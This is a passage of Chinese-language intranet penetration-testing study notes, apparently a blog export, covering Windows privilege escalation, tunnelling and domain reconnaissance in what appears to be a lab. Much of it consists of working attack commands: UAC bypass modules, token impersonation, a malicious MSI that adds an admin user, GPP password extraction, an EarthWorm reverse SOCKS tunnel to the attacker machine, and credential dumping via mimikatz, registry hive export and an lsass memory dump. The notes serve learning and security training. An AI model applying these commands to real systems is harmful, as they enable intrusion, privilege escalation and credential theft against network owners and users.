+<h4 id="Ⅱ-ByPassUAC"><a href="#Ⅱ-ByPassUAC" class="headerlink" title="Ⅱ ByPassUAC"></a>Ⅱ ByPassUAC</h4><p><strong>关于UAC</strong><br>User Account Control，用户帐户控制是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/3.png" alt="图片"><br>这里我主要介绍使用msf以及另外两个框架内来bypass，以及简单利用CobaltStrike4.0来提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">在得到反弹的meterpreter后，我们执行background，将session放到后台，之后，选取bypass模块。
+msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac &#x2F;&#x2F;或者use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection
+                                           &#x2F;&#x2F;或者use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbs
+msf5 &gt; show options
+msf5 &gt; set session 3    &#x2F;&#x2F;这里的session就是我们反弹shell得到的meterpreter
+msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">这里介绍使用nishang开源框架，主要用于后渗透攻击，存在许多模块，比如提权，端口扫描，后门等等。
+首先下载nishang后上传到目标机器（win7），之后使用msf获取的用户权限的shell导入nishang框架，并使用。
+import-module .\nishang.psm1    &#x2F;&#x2F;导入
+Get-Command -Module nishang     &#x2F;&#x2F;获取可以使用的module
+Invoke-PsUACme                &#x2F;&#x2F;使用bypassuac这个模块进行提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">最后介绍Empire框架，它类似于msf，也是一款集成的工具。
+首先我们需要下载并安装Empire到kali，之后操作类似msf反弹shell，可以获取目标机器的会话（这里略过）。之后bypass提权我们使用usemodule privesc&#x2F;bypassuac这个模块。
+&gt; usemodule privesc&#x2F;bypassuac
+&gt; info
+&gt; set listener w7   &#x2F;&#x2F;这里的w7是之前反弹会话时设置的监听
+&gt; execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">CobaltStrike4.0（大名鼎鼎QAQ）
+以kali为例讲解
+下载好以后进入其目录，打开两个终端以便于后续操作，以下指令最好用root权限执行。
+.&#x2F;teamserver 10.188.10.200 pass &#x2F;&#x2F;终端1执行，IP是本机地址，pass是自己设置的密码（一会要用）
+.&#x2F;start.sh                      &#x2F;&#x2F;终端2执行，打开CobaltStrike界面，输入用户名（随意）和密码（刚才设置的）
+Cobalt Strike-&gt;Listenners   &#x2F;&#x2F;界面操作，创建listener
+Attacks-&gt;Packages-&gt;Windows Executable  &#x2F;&#x2F;生成反弹shell的文件，生成后上传到目标主机win7，并运行
+类似于meterpreter，我们会获得一个beacon用来执行命令。
+之后进行提权，我们这里选择uac提权，也可以选择其他方式。以图来说明。
+
+CobaltStrike还有其他许多用处比如：桌面交互、进程列表、端口扫描、代理、钓鱼等功能，
+域内功能包括mimikatz、hashdump、金票据等等，我们之后也会陆续介绍。可以说CobaltStrike是一款强大的图形化的内网工具。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/4.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/5.png" alt="图片"></p>
+<h4 id="Ⅲ-令牌窃取"><a href="#Ⅲ-令牌窃取" class="headerlink" title="Ⅲ 令牌窃取"></a>Ⅲ 令牌窃取</h4><p><strong>关于Token</strong><br>Windows有两种类型的Token：<br>1.Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)<br>2.Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文档夹)</p>
+<p>另外，两种token只在系统重启后清除。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
+<p>这里介绍两种方式使用令牌窃取进行提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">incognito：exe&#x2F;msf均可，msf中的incognito是从windows中的exe文件中移植过去的，这里以msf自带的incognito为例。
+首先我们进入之前获取的meterpreter
+msf5 &gt; session 3
+meterpreter &gt; load incognito                            &#x2F;&#x2F;加载incognito（除了incognito外还可以加载其他插件比如mimikatz，我们之后会用到）
+meterpreter &gt; getuid                                    &#x2F;&#x2F;查看当前token 
+meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;列出可用token
+meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   &#x2F;&#x2F;token窃取，格式为impersonate_token&quot;主机名\\用户名&quot;
+meterpreter &gt; getuid                                    &#x2F;&#x2F;查看当前token 
+meterpreter &gt; rev2self                                  &#x2F;&#x2F;返回之前的token
+
+windows平台下的incognito.exe操作与此类似。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">rotten potato+meterpreter，适用于当没有Impersonmate Token时的情况。
+首先上传rottenpotato.exe到目标主机
+meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;此时只有当前用户令牌
+meterpreter &gt; execute -cH -f rottenpotato.exe           &#x2F;&#x2F;执行rottenpotato模仿system令牌
+meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;此时会有system权限的模仿令牌
+meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   &#x2F;&#x2F;token窃取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="Ⅳ-系统配置错误提权"><a href="#Ⅳ-系统配置错误提权" class="headerlink" title="Ⅳ 系统配置错误提权"></a>Ⅳ 系统配置错误提权</h4><p><strong>可信任服务路径</strong></p>
+<p><strong>包含空格且没有引号的路径漏洞</strong><br>计算机系统管理员在配置相关服务时，会指定可执行文件的路径，但是如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。<br>比如：C:\Program Files\Vul file\example.exe<br>尝试依次执行：C:\Program.exe、C:\Program Files\Vul.exe、C:\Program Files\Vul file\example.exe</p>
+<p>如果可以找到这样的路径，我们只需要写的权限，可以放置一个恶意文件，让操作系统把恶意文件执行。<br><strong>查找可信任服务路径</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">使用wmic查询：
+wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;trust_service_path
+msf5 &gt; show options &#x2F;&#x2F;可以看到只需要之前获取的meterpreter的session
+msf5 &gt; set session 3
+msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>系统服务权限配置错误</strong><br>低权限用户对系统调用的可执行文件有写权限，可以将该文件替换成任意可执行文件。<br><strong>查找权限配置错误</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">import-module powerup.ps1
+invoke-allchecks    &#x2F;&#x2F;可以查找目标机器多种配置错误，包括环境变量等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions
+之后只需设置session即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/6.png" alt="图片"><br><strong>AlwaysInstallElevated</strong><br>是一种允许非管理用户以system权限运行安装程序包（.msi文件）的设置。默认情况下禁用此设置，需系统管理员手动启用。<br><strong>查找并利用</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">import-module powerup.ps1
+get-registryAlwaysInstallElevated   &#x2F;&#x2F;若返回true则可以继续利用
+write-useraddmsi                    &#x2F;&#x2F;生成恶意msi文件
+useradd.msi，msiexec &#x2F;q &#x2F;i useradd.msi &#x2F;&#x2F;以普通权限运行命令，会添加一个管理员用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>配置文件窃取</strong><br>网络管理员配置时的配置文件，可能存在密码等信息。主要是搜索文件系统来查找常见的敏感文件。</p>
+<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;b &#x2F;s c:Unattend.xml
+C:\Users\user\Desktop&gt; dir C:\*vnc.ini &#x2F;s &#x2F;b &#x2F;c
+C:\Users\user\Desktop&gt; dir C:\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \*password\*
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; post&#x2F;windows&#x2F;gather&#x2F;enum_unattend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>GPP（组策略首选项）</strong></p>
+<p><strong>组策略首选项</strong><br>管理员在域中新建策略后，会在SYSVOL共享目录中生成XML文件，保存着密码等敏感信息。</p>
+<pre class="line-numbers language-none"><code class="language-none">powersploit框架（类似于nishang框架，也是一款后渗透神器）
+首先下载powersploit框架后，进入目录打开命令窗口
+import-module powersploit.psm1  &#x2F;&#x2F;导入powersploit
+get-command                     &#x2F;&#x2F;获取导入后可用的攻击模块
+get-gpppassword                 &#x2F;&#x2F;这个模块可以可以查询相关GPP信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="Ⅴ-其他应用提权"><a href="#Ⅴ-其他应用提权" class="headerlink" title="Ⅴ 其他应用提权"></a>Ⅴ 其他应用提权</h4><p>其他应用主要是拿到webshell后进行数据库提权，比如mysql、mssql等，或者目标主机上的其他应用。</p>
+<h3 id="0x04-隧道搭建"><a href="#0x04-隧道搭建" class="headerlink" title="0x04 隧道搭建"></a>0x04 隧道搭建</h3><p>隧道的搭建是内网渗透中必不可少的一环，利用打通的隧道，攻击者可以通过内网边缘主机进入内网环境，实施进一步的攻击。<br>在一开始的内网架构说明中，我们的win7（10.188.16.131）位于边缘部分，我们拿下以后，将以此为跳板进入内网实施攻击。总结的脑图如下（我们接下来将讲述图中几种隧道搭建的方式）：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/7.png" alt="图片"></p>
+<h4 id="代理工具（linux-gt-proxychains-windows-gt-proxifier）-ew（socks）"><a href="#代理工具（linux-gt-proxychains-windows-gt-proxifier）-ew（socks）" class="headerlink" title="代理工具（linux-&gt;proxychains/windows-&gt;proxifier）+ew（socks）"></a>代理工具（linux-&gt;proxychains/windows-&gt;proxifier）+ew（socks）</h4><p><strong>linux下的proxychains+ew（earthworm）</strong><br><strong>目标：</strong><br>在目标机器win7（10.188.16.131和192.168.174.119）上使用ew转发到我们的攻击机kali的8888端口（10.188.10.200）；<br>然后我们在kali上使用ew将win7转发过来的流量映射到本地的1080端口，之后我们使用proxychains代理访问本地的1080端口，那么流量就会从kali的1080到kali的8888再到win7主机。<br>即：10.188.10.200:1080-&gt;10.188.10.200:8888-&gt;10.188.16.131<br><strong>操作：</strong><br>1.下载linux和windows下的ew（earthworm），并上传到kali和win7；<br>2.在linux上安装proxychains，并进行配置；</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install proxychains4   &#x2F;&#x2F;安装proxychains4
+vi &#x2F;etc&#x2F;proxychains.conf            &#x2F;&#x2F;设置配置文件，具体内容下文给出
+&#x2F;*proxychains.conf内容：第一步：proxy_dns前面加“#”，将其注释；第二步：在[proxylist]下面只留下“socks5  127.0.0.1 1080”这一行。配置完成，保存退出。*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/8.png" alt="图片"><br>3.在win7和kali依次使用ew：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew_for_Linux -s rcsocks -l 1080 -e 8888     &#x2F;&#x2F;kali上执行
+ew_for_Win.exe -s rssocks -d 10.188.10.200 -e 8888  &#x2F;&#x2F;win7上执行
+之后就可以在kali上使用proxychain4来访问了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/9.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/10.png" alt="图片"><br>4.用proxychains4和nmap扫描。</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 nmap 192.168.174.119 -Pn
+(之前不能访问这个网段，但是经过隧道后可以访问了)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>PS：还可以使用ew进行多级代理，有兴趣的读者可以自行学习。</p>
+<h4 id="windwos下的proxifier-ew（earthworm）"><a href="#windwos下的proxifier-ew（earthworm）" class="headerlink" title="windwos下的proxifier+ew（earthworm）"></a>windwos下的proxifier+ew（earthworm）</h4><p>这种情况是适用于攻击机不是linux而是windows系统时，其中ew的操作相同，只有proxychains换为了windows下的proxifier。<br>因此，我们主要介绍proxifier的使用。<br><strong>proxifier使用</strong><br>1.下载后安装；<br>2.启动ew；<br>3.启动proxifier后，添加代理服务和代理规则；<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/11.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/12.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/13.png" alt="图片"><br>之后使用chrome就可以访问192.168.174.119的服务器。</p>
+<h4 id="关于其他方式的说明"><a href="#关于其他方式的说明" class="headerlink" title="关于其他方式的说明"></a>关于其他方式的说明</h4><p>除了ew以外，其他隧道搭建工具比如nc（netcat）、lcx、reGeorg等等都可以使用，我这里只是提供了一种方式。感兴趣的读者可以根据之前给出的隧道搭建的脑图自行学习。</p>
+<h3 id="0x05-信息搜集2"><a href="#0x05-信息搜集2" class="headerlink" title="0x05 信息搜集2"></a>0x05 信息搜集2</h3><p>在提权和隧道做好以后，我们接下来将正式第一次从内网边缘向内网内部“窥探”。第二次的信息搜集主要需要对内网主机进行探测，另外需要对域信息进行搜集，包括：域内用户信息，域控信息，NTLM hash等等，目的是为接下来的横向渗透做基础。</p>
+<h4 id="林"><a href="#林" class="headerlink" title="林"></a>林</h4><p>林是域的集合，多个域组成了林。比方说，xxx北京分公司在一个域，xxx上海分公司在另外一个域，而这两个域又在同一个林中，方便了管理。</p>
+<h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><p>域是区别于工作组的，为了方便管理和有效区分各个部门域，常见于企业公司中。</p>
+<p>域的体系结构中最重要的是域控（DC），域控是装有活动目录（AD）的计算机，域控可以通过LDAP查询AD控制域内的所有内容，并加以控制。一个域内可以有多台域控，每台域控有独立的AD；</p>
+<p>活动目录（AD）：Active Directory是微软对目录服务数据库的实现，AD存储了有关域内对象的信息，方便管理员和用户可以查找并使用这些信息。其中通过LDAP（轻量级目录访问协议）来访问AD；</p>
+<p>Naming Context和Application Partitions：Naming Context是Active Directory的分区，分区的主要目的是在有多台域控的时候，每台域控只需要复制其他域控某些分区的内容即可，减少了工作量。三个默认存在的Naming Context是：Configuration NC(Configuration NC)、Schema NC(Schema NC)、Domain NC(DomainName NC)。在之后，微软允许用户自定义分区来扩展Naming Context，这就是Application Partitions。两个预置的是：DomainDnsZones和ForestDnsZones；</p>
+<p>域环境下的用户：使用用户名以及密码通过域控制器进行验证，可以在同一域内的任何一台计算机登陆。其中管理员用户又称为域管，这里的域管理员用户与域控本机的管理员其实是分开的，但是他们的密码是相同的；</p>
+<p>域内的组：用户是属于组的。组按照用途分为通讯组和安全组，其中安全组是权限的集合，如果需要赋予某个用户某种权限，那就可以将这个用户加入对应的组。安全组又分为域本地组、通用组和全局组。<br>常见的域本地组是Administrators，它具备系统管理员的权限，拥有对整个域最大的控制权。<br>常见的通用组是Enterprise Admins，在林中，只有林根域才有这个组，林中其他域没有这个组，但其他域默认会把这个组加入到本域的Administrators里面去。<br>常见的全局组是Domain Admins，也就是域管组。其中Administrators包括Domain Admins和Enterprise Admins；</p>
+<p>域内的组织单位（OU）：Organization Unit是专用容器，区别于普通容器的一点是OU受组策略的控制，它与组完全不同：组是权限的集合，而组织单位是被管理者的集合。组织单位包括：用户，计算机，工作组，其他组织单位等；</p>
+<p>组策略：组策略可以控制本机和域内的用户以及他们的操作。组策略分为本机组策略和域的组策略，其中本机组策略用于计算机管理员管理本机所有用户，而域的组策略用于域管对于域内用户的控制。在后面我们会介绍通过组策略设置后门；</p>
+<p>这是最后总结的图：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/14.png" alt="图片"></p>
+<h4 id="搜集相关"><a href="#搜集相关" class="headerlink" title="搜集相关"></a>搜集相关</h4><p><strong>基础</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">最主要目的是确认自己所处的是哪个域，以及域控的位置。
+域控一般是本机的DNS服务器。
+ipconfig &#x2F;all
+net time &#x2F;domain
+    &#x2F;*1. 找不到域控制器:处于工作组，不存在域；
+    2. 发生错误,拒绝访问:存在域，不是域用户；
+    3. 查询成功:存在域，是域用户；*&#x2F;
+net view &#x2F;domain
+net user &#x2F;domain
+net group &#x2F;domain
+net group &quot;domain admins&quot; &#x2F;domain
+net group &quot;domain computers&quot; &#x2F;domain
+net group &quot;domain controllers&quot; &#x2F;domain
+net accounts &#x2F;domain
+net config workstation
+wmic useraccount get &#x2F;all
+net loaclgroup [administrator]
+nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:域控IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>端口、存活主机探测</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">nbtscan.exe 192.168.52.0&#x2F;24 &#x2F;&#x2F;内网存活主机探测
+---
+use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp  &#x2F;&#x2F;端口扫描，msf和其他下面的框架还有其他收集信息的模块，也都可以尝试。
+---
+PowerSploit：Invoke-Portscan.ps1
+---
+powerview：Invoke-userhunter&#x2F;Invoke-processhunter
+---
+Nishang：Invoke-PortScan
+---
+PsLoggedon.exe      &#x2F;&#x2F;查询谁登陆过机器
+---
+PVEFindADUser.exe   &#x2F;&#x2F;枚举域用户以及登陆过特定系统的用户
+---
+BloodHound          &#x2F;&#x2F;内网域渗透提权综合分析工具
+---
+除此以外还有其他许多方法，读者可以自行探索、留言交流。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>密码获取</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">密码的获取是重中之重，关系到我们下一步横向渗透，
+比如说利用pth、ptt、金票据、银票据、AS-REP Roasting和ntlm-relay等等的实现以及原理都放到下一篇文章中讲解。
+
+神器mimikatz（msf也有内置的mimikatz模块）：
+    privilege::debug
+    sekurlsa::logonpasswords
+目前mimikatz一般会报毒，所以推荐将保存在注册表中的密码信息导出，传到本地再用mimikatz：
+    reg save HKLM\SYSTEM C:\windows\temp\Sys.hiv    &#x2F;&#x2F;cmd命令导出Sys.hiv文件
+    reg save HKLM\SAM C:\windows\temp\Sam.hiv       &#x2F;&#x2F;cmd命令导出Sam.hiv文件
+    lsadump::sam &#x2F;sam:Sam.hiv &#x2F;system:Sys.hiv           &#x2F;&#x2F;mimikatz解密
+读取内从中密码：
+    procdump.exe -accepteula -ma lsass.exe lsass.dmp        &#x2F;&#x2F;导出文件下载到本地
+    mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;      &#x2F;&#x2F;本地mimikatz解密
+LaZagne工具可以读取机器内的浏览器、SSH等保存的密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h3><p><a href="https://www.anquanke.com/post/id/221264#h3-14">https://www.anquanke.com/post/id/221264#h3-14</a><br>感谢大佬的文章！</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>内网学习</category>
+      </categories>
+      <tags>
+        <tag>2021.11</tag>
       </tags>
   </entry>
 </search>
